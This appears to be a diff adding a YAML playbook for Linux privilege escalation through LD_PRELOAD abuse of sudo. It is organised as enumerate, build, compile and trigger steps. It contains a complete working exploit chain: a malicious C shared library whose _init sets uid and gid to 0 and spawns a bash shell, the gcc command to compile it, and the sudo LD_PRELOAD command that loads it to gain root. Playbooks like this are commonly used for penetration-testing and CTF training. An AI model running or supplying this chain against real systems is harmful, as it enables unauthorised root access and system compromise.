@@ -1,0 +1,101 @@
+name: Linux Privilege Escalation - Shared Libraries
+
+steps:
+
+# =========================================================
+# [1] ENUMERATE LD_PRELOAD
+# =========================================================
+- title: Enumerate LD_PRELOAD
+  mode: enum
+  info: |
+    Identify sudo configurations allowing LD_PRELOAD abuse.
+
+  entries:
+
+    - cmd: "sudo -l"
+      info: enumerate sudo permissions
+
+      look_for:
+        - "env_keep+=LD_PRELOAD"
+        - "NOPASSWD"
+        - "restart/service binaries"
+        - "absolute binary paths"
+
+    - cmd: "env | grep LD_PRELOAD"
+      info: check current preload variables
+
+  notes:
+    - LD_PRELOAD allows loading arbitrary shared libraries
+    - shared library executes before target binary
+    - if sudo preserves LD_PRELOAD → usually instant root
+
+# =========================================================
+# [2] CREATE MALICIOUS LIBRARY
+# =========================================================
+- title: Create Malicious Library
+  mode: script
+  info: |
+    Build malicious shared object for privilege escalation.
+
+  entries:
+
+  script: |
+    #include <stdio.h>
+    #include <sys/types.h>
+    #include <stdlib.h>
+    #include <unistd.h>
+
+    void _init() {
+        unsetenv("LD_PRELOAD");
+        setgid(0);
+        setuid(0);
+        system("/bin/bash");
+    }
+
+  notes:
+    - _init executes automatically when library loads
+    - unsetenv avoids recursive preload issues
+    - spawns root shell immediately
+
+# =========================================================
+# [3] COMPILE SHARED OBJECT
+# =========================================================
+- title: Compile Shared Object
+  mode: chain
+  info: |
+    Compile malicious preload library.
+
+  entries:
+
+    - cmd: "gcc -fPIC -shared -o root.so root.c -nostartfiles"
+      info: compile shared object
+
+    - cmd: "ls -l root.so"
+      info: verify compilation
+
+  notes:
+    - -fPIC generates position independent code
+    - -shared creates .so library
+    - resulting file is loaded via LD_PRELOAD
+
+# =========================================================
+# [4] TRIGGER PRIVESC
+# =========================================================
+- title: Trigger LD_PRELOAD PrivEsc
+  mode: chain
+  info: |
+    Execute sudo command while forcing malicious library load.
+
+  entries:
+
+    - cmd: "sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart"
+      info: execute vulnerable sudo command
+
+    - cmd: "id"
+      info: verify root access
+
+  notes:
+    - replace apache2 with allowed sudo binary
+    - full path required in most cases
+    - binary itself does not need GTFOBins payloads
+    - library executes before target binary
